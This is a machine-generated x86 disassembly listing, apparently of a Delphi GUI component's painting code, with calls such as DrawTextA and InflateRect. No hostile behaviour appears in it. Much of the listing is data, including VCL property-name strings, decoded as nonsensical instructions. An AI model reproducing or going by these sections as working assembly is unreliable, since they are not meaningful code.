add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
and al 0xd6
inc ebx
add [ eax + eax ] ch
add [ eax ] al
js r-xdata
inc edx
add al cl
push esi
inc esp
add [ eax ] dh
adc [ edx ] eax
je r-xdata
inc esp
add [ eax - 0x53ffbfcc ] ah
xor al 0x40
add [ eax - 0x4bffbfcc ] dh
xor al 0x40
add [ eax + 0x8004034 ] ch
xor al [ eax ]
and al 0x32
inc eax
add al cl
adc [ edx ] al
mov al 0xfc
inc ebx
add ah bh
adc [ edx ] al
enter 0x4456 0x0
xor [ ecx ] dl
inc edx
add [ edi + edx * 2 + 0x44 ] dh
push edi
inc esp
add al bh
inc ebp
add ah bh
inc ebp
add [ edi + edx * 2 + 0x44 ] dl
add ah al
push esp
inc esp
add [ ecx ] dl
push esp
inc edx
jne r-xdata
add [ eax + 0x14004210 ] al
adc [ edx ] eax
push 0xb4004211
push ebp
inc esp
add ah dl
cld
inc ebx
add [ eax ] ch
push esi
inc esp
add [ eax + 0x2e ] cl
inc ebp
add [ eax - 0x73 ] dh
inc esp
add [ eax + 0x5c004457 ] ah
push esi
inc esp
add [ eax - 0x53ffbad2 ] bl
inc ebp
add [ esi + edx * 2 + 0x2ed40044 ] dl
inc ebp
add al dh
push esi
inc esp
add [ edi * 8 + 0x57100043 ] cl
inc esp
add ah ah
inc ebp
add [ eax - 0x73 ] bh
inc esp
add [ eax + ebx * 2 ] al
inc esp
add [ eax + ebx * 2 + 0x44 ] al
add [ eax ] dh
inc esp
inc esp
je r-xdata
add [ eax - 0x3 ] dh
inc ebx
add [ eax - 0x63ffbb2a ] al
fild [ eax + eax - 0x18 ]
fiadd [ eax + eax - 0x58 ]
pop edx
inc esp
add ah bh
rol [ eax + eax + 0x1c ] 0x1
rol [ eax + eax + 0x34 ] 0x1
into
inc esp
add al dh
pop ecx
inc esp
add ah dh
pop ecx
inc esp
add ah ah
mov [ eax + eax + 0x10 ] eax
mov al [ eax + eax + 0x34 ]
inc esp
add [ ebx + ebx * 2 + 0x44 ] ch
add al al
inc sp
add [ eax ] bh
inc sp
add [ ecx + ebp * 2 + 0x44 ] cl
add al bh
inc esp
add [ esi + edi * 8 ] bh
inc ebx
add [ edx + ecx * 4 - 0x3177ffbc ] dl
inc esp
add [ edi + ecx * 8 + 0x44 ] al
add [ eax - 0x36 ] al
inc esp
add [ eax ] ch
iretd
add ah dh
cmovb eax [ eax ]
fmul [ edx + eax * 2 ]
add ah dl
or al 0x42
add ah bh
cmovb eax [ eax ]
jo r-xdata
inc esp
add [ ebp + 0x44 ] cl
outsb
inc ecx
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
dec esp
imul ebp [ esi + 0x6b ] 0xd684c08b
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edi + edx * 8 + 0x43 ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
push esp
xlat
inc ebx
add [ esi - 0x29 ] ch
inc ebx
add [ edx + eax ] cl
add [ eax ] al
dec esp
sub eax [ eax + eax - 0x24 ]
cmovb eax [ eax ]
lodsb [ esi ]
xor al 0x40
add [ eax ] dh
or [ edx ] eax
mov ah 0x34
inc eax
add ah cl
stosd [ edi ]
inc esp
add [ eax ] cl
xor al [ eax ]
and al 0x32
inc eax
add [ esi + ecx * 4 - 0x2493ffbc ] ah
inc esp
add [ ebx - 0x74b3ffbc ] dl
inc ecx
add [ eax + ecx * 4 ] dl
inc esp
add [ esp + ebx * 2 ] dh
inc esp
add [ eax - 0x70 ] cl
sub_43d70e
inc esp
add al al
nop
inc esp
add [ edi + edx * 4 + 0x44 ] dl
add ah dh
movsb [ edi ] [ esi ]
inc esp
add [ edi + edi * 8 ] ch
inc ebx
add ah bl
mov eax [ 0xffffffffa00c0044 ]
inc esp
add [ ebp - 0x5a6fffbc ] cl
inc esp
add [ eax - 0x5c ] cl
inc esp
add al dh
mov [ 0xffffffffd0680044 ] eax
inc esp
add [ eax ] bh
scasb [ edi ]
inc esp
add [ edx + 0x44 ] bl
add ah ah
int3
sub_43d7cd
fadd [ ebx ]
sbb [ edx ] al
add [ eax ] al
cmp dh dl
inc ebx
add ah bl
cmovb eax [ eax ]
lodsb [ esi ]
xor al 0x40
add [ eax ] dh
or [ edx ] eax
mov ah 0x34
inc eax
add ah cl
stosd [ edi ]
inc esp
add [ eax ] cl
xor al [ eax ]
and al 0x32
inc eax
add [ esi + ecx * 4 - 0x2493ffbc ] ah
inc esp
add [ ebx - 0x74b3ffbc ] dl
inc ecx
add [ eax + ecx * 4 ] dl
inc esp
add [ esp + ebx * 2 ] dh
inc esp
add [ eax - 0x70 ] cl
inc esp
add [ ebp + 0x44 ] cl
add ah dh
cmovb eax [ eax ]
fmul [ edx + eax * 2 ]
add ah dl
or al 0x42
add ah bh
cmovb eax [ eax ]
inc [ fs : ebx ]
adc dh 0x44
add [ ebx + ebx * 8 - 0x2517ffbc ] bl
inc esp
add [ eax - 0x3ffbba6 ] ch
rol [ eax + eax + 0x1c ] 0x1
rol [ eax + eax + 0x34 ] 0x1
into
inc esp
add al dh
pop ecx
inc esp
add ah dh
pop ecx
inc esp
add ah ah
mov [ eax + eax + 0x10 ] eax
mov al [ eax + eax + 0x34 ]
inc esp
add [ ebx + ebx * 2 + 0x44 ] ch
add al al
inc sp
add [ eax ] bh
inc sp
add [ ecx + ebp * 2 + 0x44 ] cl
add al bh
inc esp
add [ esi + edi * 8 ] bh
inc ebx
add [ edx + ecx * 4 - 0x3177ffbc ] dl
inc esp
add [ edi + ecx * 8 + 0x44 ] al
add [ eax - 0x36 ] al
inc esp
add [ eax ] ch
iretd
sub_43d882
inc esp
add al al
nop
inc esp
add [ edi + edx * 4 + 0x44 ] dl
add ah dh
movsb [ edi ] [ esi ]
inc esp
add [ eax ] bh
inc esp
add ah bl
mov eax [ 0xb40044 ]
inc esp
add [ ebp - 0x5a6fffbc ] cl
inc esp
add [ eax - 0x5c ] cl
inc esp
add al dh
mov [ 0xffffffffd0680044 ] eax
inc esp
add [ eax ] bh
scasb [ edi ]
inc esp
add [ edx + 0x44 ] bl
add ah ah
int3
sub_43d8be
inc esp
add [ esi + edi * 8 ] dl
inc ebx
add [ eax ] bh
inc [ ebx ]
[ ebx ]
or [ eax ] al
add eax 0x7b006b0
mov al 0x11
mov ebp 0x14bd35
jmp r-xdata
dec eax
jmp eax
sub_43df9e
inc esp
add al al
nop
inc esp
add [ edi + edx * 4 + 0x44 ] dl
add ah dh
movsb [ edi ] [ esi ]
inc esp
add [ esp + eax ] dl
inc esp
add ah bl
mov eax [ 0x4700044 ]
inc esp
add [ ebp - 0x5a6fffbc ] cl
inc esp
add [ eax - 0x5c ] cl
inc esp
add al dh
mov [ 0xffffffffd0680044 ] eax
inc esp
add [ eax ] bh
scasb [ edi ]
inc esp
add [ edx + 0x44 ] bl
add ah ah
int3
sub_43dfda
inc esp
add [ ebx + eax + 0x3ac0044 ] cl
inc esp
add [ eax ] bh
add eax [ eax + eax + 0x6 ]
add [ 0x6b01000 ] al
mov al 0x11
mov ebp 0xffcaffeb
pushfd
add al 0x44
add [ eax - 0x47ffbbfc ] dh
add al 0x44
add [ ebp + eax + 0x44 ] dl
add [ eax + 0x3 ] bh
inc esp
add [ ebx + eax ] cl
inc esp
add [ edi ] cl
push esp
inc ebx
jne r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
mov ecx fs
inc ebx
add [ eax ] bl
add al [ eax ]
add al cl
fiadd [ ebx ]
fmul [ edi ]
inc edx
add [ esp + esi + 0x9300040 ] ch
inc edx
add [ esp + esi - 0x5433ffc0 ] dh
je r-xdata
add [ eax ] al
insd
inc ebx
push 0x426b6365
outsd
js r-xdata
inc esp
add [ esp + eax ] dl
inc esp
add ah bl
mov eax [ 0x4700044 ]
inc esp
add [ ebp - 0x5a6fffbc ] cl
inc esp
add [ eax - 0x5c ] cl
inc esp
add al dh
mov [ 0xffffffffd0680044 ] eax
inc esp
add [ eax ] bh
scasb [ edi ]
inc esp
add [ edx + 0x44 ] bl
add ah ah
int3
shl [ eax ] 0x43
add [ edi ] al
inc esp
add [ eax ] cl
xor al [ eax ]
and al 0x32
add [ eax ] dh
or [ edx ] eax
mov ah 0x34
inc eax
add ah cl
stosd [ edi ]
outsd
insd
inc ebx
push 0x426b6365
outsd
js r-xdata
add [ eax ] dl
inc eax
add [ ecx + eax - 0x2d770100 ] ah
inc esp
add [ ecx ] al
fild [ ebx ]
adc bh 0x43
add [ eax + eax ] cl
or [ ebx + 0x74 ] dl
inc ebx
je r-xdata
andps xmm0 [ ebx + 0x75 ]
jae r-xdata
loopne r-xdata
inc ecx
add [ eax + ecx * 4 ] dl
inc esp
add [ esp + ebx * 2 ] dh
inc esp
add [ eax - 0x70 ] cl
inc esp
add [ ebp + 0x44 ] cl
add ah dh
cmovb eax [ eax ]
fmul [ edx + eax * 2 ]
add ah dl
or al 0x42
add ah bh
cmovb eax [ eax ]
mov al [ 0xffffffff80004402 ]
salc
inc esp
add [ ebx + ebx * 8 - 0x2517ffbc ] bl
inc esp
add [ eax - 0x3ffbba6 ] ch
rol [ eax + eax + 0x1c ] 0x1
rol [ eax + eax + 0x34 ] 0x1
into
inc esp
add al dh
pop ecx
inc esp
add ah dh
pop ecx
inc esp
add ah ah
mov [ eax + eax + 0x10 ] eax
mov al [ eax + eax + 0x34 ]
inc esp
add [ ebx + ebx * 2 + 0x44 ] ch
add al al
inc sp
add [ eax ] bh
inc sp
add [ ecx + ebp * 2 + 0x44 ] cl
add al bh
inc esp
add [ esi + edi * 8 ] bh
inc ebx
add [ edx + ecx * 4 - 0x3177ffbc ] dl
inc esp
add [ edi + ecx * 8 + 0x44 ] al
add [ eax - 0x36 ] al
inc esp
add [ eax ] ch
iretd
insb
fild [ eax + eax - 0x6c ]
mov [ 0xffffffff8b4c0044 ] eax
insb
jae r-xdata
inc eax
add [ esi + ecx * 4 - 0x2493ffbc ] ah
inc esp
add [ ebx - 0x74b3ffbc ] dl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx + 0x43 ] bl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
or eax [ eax ]
pop es
push esp
popad
bound edx [ ebx + 0x74 ]
outsd
jo r-xdata
add [ eax ] al
adc [ eax ] al
movsb [ edi ] [ esi ]
add [ eax ] eax
dec [ eax + 0x10044d2 ]
sub_43e142
inc esp
add al al
nop
inc esp
add [ edi + edx * 4 + 0x44 ] dl
add ah dh
movsb [ edi ] [ esi ]
inc esp
add [ esp + eax ] dl
inc esp
add ah bl
mov eax [ 0x4700044 ]
inc esp
add [ ebp - 0x5a6fffbc ] cl
inc esp
add [ eax - 0x5c ] cl
inc esp
add al dh
mov [ 0xffffffffd0680044 ] eax
inc esp
add [ eax ] bh
scasb [ edi ]
inc esp
add [ edx + 0x44 ] bl
add ah ah
int3
sub_43e29a
sbb dh bh
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
adc al [ eax ]
pop es
inc ebx
push 0x656b6365
fcomp [ fs : esi ]
inc edx
add [ eax ] dh
add bh bh
add al 0x69
inc esp
add [ eax ] ah
imul eax [ eax + eax ] 0x800000
add [ eax ] al
adc [ ebx ] 0x0
add eax 0x6f6c6f43
jb r-xdata
add [ ebp - 0x6b00ffff ] ah
rol [ eax + eax - 0x48 ] 0x1
rol [ eax + eax ] 0x1
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x43050015 ] al
je r-xdata
sbb al 0x44
add [ eax + eax ] dh
[ esp + ecx * 4 ]
add [ gs : eax ] dl
inc eax
add [ eax ] dl
add dh bh
add [ fs : eax ] al
xor eax [ eax + eax * 2 + 0x14 ]
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0xc ] al
push ss
add [ edx ] cl
inc esp
jb r-xdata
add [ eax ] eax
add [ eax ] al
sbb [ eax ] eax
pop es
inc ebp
outsb
popad
bound ebp [ ebp + 0x64 ]
js r-xdata
inc ebx
jne r-xdata
add bh bh
insb
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
sbb eax [ eax ]
push cs
push eax
popad
jb r-xdata
inc edx
add [ eax ] ch
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4604001a ] al
[ eax + 0x68 ]
inc esp
add [ eax + 0x68 ] ch
jae r-xdata
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
outsb
je r-xdata
adc [ eax ] al
pushad
add [ eax ] al
[ eax + eax ]
add bh bh
pop eax
push 0x68680044
jb r-xdata
add [ eax - 0x80000000 ] al
and [ eax ] eax
or [ ebx + 0x68 ] dl
outsd
ja r-xdata
outsb
je r-xdata
add [ eax ] al
add [ 0x61500b00 ] bl
jb r-xdata
imul eax [ ecx + ebp * 2 + 0x4d ] 0x65646f
adc [ eax ] al
pop edx
add [ eax ] al
[ eax ]
inc esp
add [ edx ] bh
add bh bh
jpe r-xdata
sbb al [ eax + eax - 0x65 ]
add [ eax ] al
[ ebx + 0x1ff0000 ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
pop ss
add [ eax ] cl
inc esp
jb r-xdata
inc eax
add [ ecx + eax - 0x2d770100 ] ah
imul ebp [ esi + 0x74 ] r-xdata
or [ eax + 0x6f ] edx
outsd
outsb
je r-xdata
add [ eax ] al
add [ eax - 0x80000000 ] al
and [ eax ] al
outsb
je r-xdata
outsd
outsb
je r-xdata
sbb [ edx ] 0x0
add al 0x46
dec ebx
imul ebp [ esi + 0x64 ] r-xdata
pop ebp
add [ eax ] al
jmp [ eax ]
adc [ eax ] al
push edi
add [ eax ] al
inc [ esi - 0x782bffbc ]
inc esp
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
inc esp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
or eax [ eax ]
pop es
push esp
popad
bound edx [ ebx + 0x74 ]
outsd
jo r-xdata
jo r-xdata
adc [ eax ] al
0xd8ff0000 0x4468
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
pop ds
add [ esi ] cl
push eax
popad
jb r-xdata
push cs
je r-xdata
add [ eax ] al
sub [ eax ] 0x0
push edi
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
cmp bh 0xff
add [ eax - 0x2e ] dh
inc esp
add [ ecx ] al
outsb
jne r-xdata
add [ eax ] al
and al [ eax ]
add eax 0x74617453
adc [ gs : ebx ] bl
inc esp
add al dh
rol [ eax + eax + 0x70 ] 0x1
rol [ eax + eax + 0x1 ] cl
add [ eax ] al
outsb
je r-xdata
jo r-xdata
outsd
push ds
add [ edx ] cl
push eax
popad
jb r-xdata
xor eax [ eax + eax + 0x10 ]
inc eax
add [ ecx ] bl
add bh bh
nop
push 0x10044
add [ eax ] al
add [ eax ] al
add [ eax + 0x1 ] al
add [ eax ] 0x0
add [ eax + 0x4f09002b ] al
outsb
inc ebp
outsb
inc esp
inc esp
jb r-xdata
jo r-xdata
adc [ eax ] al
cdq
add [ eax ] al
push [ eax + ebp * 2 + 0x687c0044 ]
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x53080021 ] al
push 0x6948776f
outsb
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add al [ eax ]
inc eax
add eax [ eax + eax + 0x1 ]
push 0x6948776f
outsb
je r-xdata
dec ebx
jns r-xdata
push esp
pop eax
inc ecx
add al al
add [ eax ] eax
jo r-xdata
or cl [ edi + 0x6e ]
inc esp
jb r-xdata
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
sub [ eax ] al
pop eax
inc ecx
add [ eax ] ah
add [ eax ] eax
jmp [ eax ]
and al 0x0
pop es
push esi
imul esi [ ebx + 0x69 ] 0x656c62
adc [ eax ] al
or [ edx ] eax
add bh bh
push eax
inc [ ebx ]
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
and eax 0x6f570800
jb r-xdata
adc al [ edx ]
add bh bh
rol [ ebx ] 0x44
fiadd [ ebx ]
add [ ecx ] al
inc esp
pop ecx
inc ebp
add [ eax + eax ] bh
[ edi ]
inc esp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x50090020 ] al
outsb
dec ebx
jns r-xdata
outsd
ja r-xdata
jns r-xdata
jb r-xdata
js r-xdata
push ds
inc esp
add al dh
add [ eax ] al
push eax
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0a0029 ] al
outsb
inc esp
jb r-xdata
loopne r-xdata
jo r-xdata
sbb eax 0xd80044
or al 0x1e
inc esp
add al ah
add [ eax ] eax
jmp eax
add bh bh
fadd [ eax ]
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
xor al [ eax ]
or ecx [ edi + 0x6e ]
fadd [ eax ]
jb r-xdata
add [ eax ] al
add [ eax - 0x80000000 ] al
das
add [ edx ] cl
dec edi
outsb
dec ebx
jns r-xdata
pop eax
inc ecx
add al cl
add [ eax ] eax
dec eax
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
jb r-xdata
inc esp
add [ eax ] bl
add [ eax ] eax
[ eax ]
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x4f07002c ] al
add [ eax ] al
dec edi
jbe r-xdata
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
xor eax [ eax ]
or [ edi + 0x6e ] ecx
dec ebp
outsd
jne r-xdata
sbb al 0x44
add al dl
add [ eax ] al
call eax
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0b0031 ] al
outsb
dec ebp
outsd
jne r-xdata
popad
dec ebp
outsd
jbe r-xdata
dec ebp
outsd
jne r-xdata
dec edi
outsb
jae r-xdata
jns r-xdata
je r-xdata
outsb
inc ebp
outsb
je r-xdata
jb r-xdata
inc esi
push eax
push ebp
jo r-xdata
arpl [ ebx + 0x30 ] bp
pop ds
inc esp
add [ eax ] dl
add [ eax ] eax
call [ eax ]
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
inc esp
outsd
ja r-xdata
mov edx 0xb9
mov eax esi
call sub_445f20
mov edx 0x69
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_44ecd8
mov eax [ r-xdata ]
mov [ esi + 0x50 ] eax
add esp 0xfffffff0
call sub_4035bc
outsb
push ebx
je r-xdata
dec edi
in al 0x1c
inc esp
add al ah
add [ eax ] al
jmp eax
rcr [ 0x1e80044 ] 0x0
inc eax
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
rol [ ecx ] 0x0
sbb eax 0x1d80044
add bh bh
fadd [ ecx ]
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
add [ cs : ecx ] cl
dec edi
outsb
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f06002d ] al
outsb
inc ebp
js r-xdata
pop ds
inc esp
add [ eax ] cl
add [ eax ] eax
dec [ eax ]
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f09002a ] al
outsb
inc ebp
outsb
inc esp
outsd
arpl [ ebx + 0x78 ] bp
pop ds
mov eax esi
pop esi
pop ebx
retn
call sub_403614
pop [ fs : 0x0 ]
add [ eax ] 0x0
add [ eax + 0x4f0b0035 ] al
and [ eax + eax ] eax
add [ eax ] eax
inc [ eax ]
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0b0034 ] al
outsb
push ebx
je r-xdata
stosd [ edi ]
or [ eax + eax ] al
push ebx
jb r-xdata
pop esp
mov eax esi
call sub_445f44
mov eax esi
test bl bl
je r-xdata
add [ eax ] al
jb r-xdata
pop esi
pop ebx
retn
push 0xffffffff
push 0xffffffff
push esi
call InflateRect
call sub_424a40
mov edx r-xdata
mov eax [ ebx + 0x208 ]
call sub_42499c
add [ esi + 0x4 ] eax
push 0xffffffff
push 0xffffffff
push esi
call InflateRect
cmp [ ebx + 0x1a5 ] 0x0
je r-xdata
push 0x208838b
add [ eax ] al
inc esp
jb r-xdata
add esp 0xc
pop [ 0x0 ]
inc esp
outsd
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_4490c0
mov edx [ ebx + 0x68 ]
mov eax [ ebx + 0x208 ]
lea eax [ bx + si ]
push ebx
push esi
test dl dl
je r-xdata
sub_43e888
push ebp
mov ebp esp
mov ecx 0x11
push 0x0
push 0x0
dec ecx
jne r-xdata
push ecx
push ebx
push esi
push edi
mov ebx eax
xor eax eax
push ebp
push sub_43ec2a
push [ fs : eax ]
mov [ fs : eax ] esp
mov edi [ ebx + 0x208 ]
mov edx [ ebx + 0x68 ]
mov eax edi
call sub_424a40
call sub_43af70
call sub_43b050
test al al
je r-xdata
mov edx r-xdata
mov eax edi
call sub_42499c
mov [ ebp - 0x4 ] eax
mov eax [ ebx + 0x4c ]
push eax
lea eax [ ebp - 0x1d ]
push eax
mov edx [ ebp - 0x4 ]
sar edx 0x1
jns r-xdata
lea edx [ ebp - 0x50 ]
mov eax ebx
call sub_446764
cmp [ ebp - 0x50 ] 0x0
je r-xdata
dec edx
mov ecx [ ebx + 0x48 ]
xor eax eax
call sub_416f14
cmp [ ebx + 0x1a5 ] 0x0
je r-xdata
adc edx 0x0
push 0x0
lea eax [ ebp - 0x2d ]
push eax
xor ecx ecx
xor edx edx
xor eax eax
call sub_416f14
lea eax [ ebp - 0xc ]
push eax
lea edx [ ebp - 0x54 ]
mov eax ebx
call sub_446764
mov eax [ ebp - 0x54 ]
call sub_4042a8
push eax
lea edx [ ebp - 0x58 ]
mov eax ebx
call sub_446764
mov eax [ ebp - 0x58 ]
call sub_4044a8
push eax
mov eax edi
call sub_424b20
push eax
call GetTextExtentPoint32A
mov eax [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0x2d ]
push eax
mov ecx [ ebp - 0xc ]
xor edx edx
xor eax eax
call sub_416f14
mov eax ebx
mov si 0xffc8
call sub_40346c
test al al
jne r-xdata
mov edx 0xff000006
mov eax [ edi + 0x14 ]
call sub_4240e4
inc [ ebp - 0x1d ]
inc [ ebp - 0x19 ]
mov edx 0xff000014
mov eax [ edi + 0x14 ]
call sub_4240e4
lea edx [ ebp - 0x1d ]
mov eax edi
call sub_4247b8
push 0xffffffff
push 0xffffffff
lea eax [ ebp - 0x1d ]
push eax
call OffsetRect
mov edx 0xff000010
mov eax [ edi + 0x14 ]
call sub_4240e4
jmp r-xdata
mov [ ebp - 0x39 ] eax
mov eax [ ebp - 0x21 ]
push eax
mov eax [ ebp - 0x25 ]
push eax
mov eax [ ebp - 0x29 ]
push eax
mov eax [ ebp - 0x2d ]
push eax
mov eax edi
call sub_424b20
push eax
call ExcludeClipRect
mov eax ebx
mov edx [ eax ]
call [ edx + 0x50 ]
test al al
je r-xdata
adc eax 0x0
push 0x0
mov eax [ ebx + 0x48 ]
sub eax 0x8
sub eax [ ebp - 0x25 ]
push eax
lea eax [ ebp - 0x2d ]
push eax
call OffsetRect
jmp r-xdata
push 0x0
push 0x8
lea eax [ ebp - 0x2d ]
push eax
call OffsetRect
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43ec31
lea eax [ ebp - 0x8c ]
mov edx 0x5
call sub_40400c
lea eax [ ebp - 0x68 ]
mov edx 0x2
call sub_40400c
lea eax [ ebp - 0x60 ]
call sub_4046c8
lea eax [ ebp - 0x5c ]
mov edx 0x4
call sub_40400c
retn
mov eax ebx
mov si 0xffc8
call sub_40346c
test al al
jne r-xdata
lea edx [ ebp - 0x1d ]
mov eax edi
call sub_4247b8
lea edx [ ebp - 0x68 ]
mov eax ebx
call sub_446764
cmp [ ebp - 0x68 ] 0x0
je r-xdata
mov [ ebp - 0xd ] 0x1c
mov [ ebp - 0xd ] 0x1b
jmp r-xdata
lea edx [ ebp - 0x3d ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
mov eax [ ebp - 0x21 ]
sub eax [ ebp - 0x29 ]
sar eax 0x1
jns r-xdata
mov eax [ ebp - 0x4 ]
push eax
lea eax [ ebp - 0x78 ]
push eax
lea edx [ ebp - 0x7c ]
mov eax ebx
call sub_446764
mov edx [ ebp - 0x7c ]
mov eax [ ebx + 0x208 ]
call sub_424980
push eax
mov eax [ ebp - 0x15 ]
pop edx
sub eax edx
sub eax 0x8
xor ecx ecx
xor edx edx
call sub_416f14
push edi
lea esi [ ebp - 0x78 ]
lea edi [ ebp - 0x1d ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop edi
mov eax [ ebp - 0x4 ]
push eax
lea eax [ ebp - 0x1d ]
push eax
xor ecx ecx
xor edx edx
mov eax 0x8
call sub_416f14
jmp r-xdata
lea edx [ ebp - 0x64 ]
mov eax ebx
call sub_446764
mov edx [ ebp - 0x64 ]
lea eax [ ebp - 0x60 ]
call sub_404814
mov eax [ ebp - 0x60 ]
push eax
lea eax [ ebp - 0x2d ]
push eax
push 0x0
push 0x0
mov eax edi
call sub_424b20
push eax
call sub_43af70
lea ecx [ ebp - 0x4c ]
pop edx
call sub_43b1b8
jmp r-xdata
call sub_43af70
lea ecx [ ebp - 0x4c ]
mov dl [ ebp - 0xd ]
call sub_43b21c
lea eax [ ebp - 0x3d ]
push eax
push 0x0
mov eax edi
call sub_424b20
push eax
call sub_43af70
lea ecx [ ebp - 0x4c ]
pop edx
call sub_43b10c
push 0x0
mov eax edi
call sub_424b20
push eax
call SelectClipRgn
lea edx [ ebp - 0x5c ]
mov eax ebx
call sub_446764
cmp [ ebp - 0x5c ] 0x0
je r-xdata
mov edx 0x20
mov eax ebx
call sub_448a38
mov esi eax
mov eax esi
or eax 0x400
push eax
lea eax [ ebp - 0x1d ]
push eax
lea edx [ ebp - 0x80 ]
mov eax ebx
call sub_446764
mov eax [ ebp - 0x80 ]
call sub_4042a8
push eax
lea edx [ ebp - 0x84 ]
mov eax ebx
call sub_446764
mov eax [ ebp - 0x84 ]
call sub_4044a8
push eax
mov eax edi
call sub_424b20
push eax
call DrawTextA
mov edx [ ebx + 0x70 ]
mov eax [ edi + 0x14 ]
call sub_4240e4
push esi
lea eax [ ebp - 0x1d ]
push eax
lea edx [ ebp - 0x88 ]
mov eax ebx
call sub_446764
mov eax [ ebp - 0x88 ]
call sub_4042a8
push eax
lea edx [ ebp - 0x8c ]
mov eax ebx
call sub_446764
mov eax [ ebp - 0x8c ]
call sub_4044a8
push eax
mov eax edi
call sub_424b20
push eax
call DrawTextA
sub_43ec3b
inc [ ecx ]
add [ eax ] al
add [ eax ] dh
add [ eax ] al
add [ ebp - 0x75 ] dl
in al dx
push 0x0
push ebx
push esi
push edi
mov edi edx
mov ebx eax
xor eax eax
push ebp
push sub_43ecb6
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax ebx
call sub_446764
mov edx [ ebp - 0x4 ]
mov ax [ edi + 0x4 ]
call sub_45e09c
test al al
je r-xdata
mov edx edi
mov eax ebx
call sub_44c4d8
mov eax ebx
mov si 0xffb8
call sub_40346c
test al al
je r-xdata
mov eax ebx
call sub_44d5b4
mov [ edi + 0xc ] 0x1
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43ecbd
lea eax [ ebp - 0x4 ]
call sub_403fe8
retn
sub_43ed08
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_44e29c
mov eax [ esi + 0x50 ]
or eax [ r-xdata ]
mov [ esi + 0x50 ] eax
mov edx 0x41
mov eax esi
call sub_445f20
mov edx 0x11
mov eax esi
call sub_445f44
mov [ esi + 0x16d ] 0x1
mov [ esi + 0x170 ] 0x1
call sub_43af70
call sub_43b050
test al al
je r-xdata
add esp 0xfffffff0
call sub_4035bc
mov eax [ esi + 0x50 ]
or eax [ r-xdata ]
mov [ esi + 0x50 ] eax
mov eax [ r-xdata ]
not eax
and eax [ esi + 0x50 ]
mov [ esi + 0x50 ] eax
jmp r-xdata
mov eax esi
pop esi
pop ebx
retn
call sub_403614
pop [ fs : 0x0 ]
add esp 0xc
mov eax esi
test bl bl
je r-xdata
sub_43edb4
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov esi ecx
mov edi edx
mov ebx eax
xor eax eax
push ebp
push sub_43ef0a
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x90 ]
test esi 0x400
je r-xdata
